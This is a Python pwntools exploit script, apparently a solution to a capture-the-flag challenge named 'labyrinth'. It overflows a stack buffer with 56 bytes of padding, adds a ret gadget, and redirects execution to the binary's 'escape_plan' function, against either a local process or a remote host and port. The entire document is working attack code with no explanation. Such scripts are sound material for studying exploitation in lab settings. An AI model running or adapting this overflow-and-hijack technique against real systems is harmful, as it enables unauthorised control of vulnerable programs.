#!/usr/bin/env python3

from pwn import context, p64, remote, sys

context.binary = 'labyrinth'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def main():
    p = get_process()

    offset = 56
    junk = b'A' * offset

    ret_addr = 0x401016

    payload  = junk
    payload += p64(ret_addr)
    payload += p64(context.binary.sym.escape_plan)

    p.sendlineafter(b'>> ', b'69')
    p.sendlineafter(b'>> ', payload)

    print(p.recvall().decode())


if __name__ == '__main__':
    main()
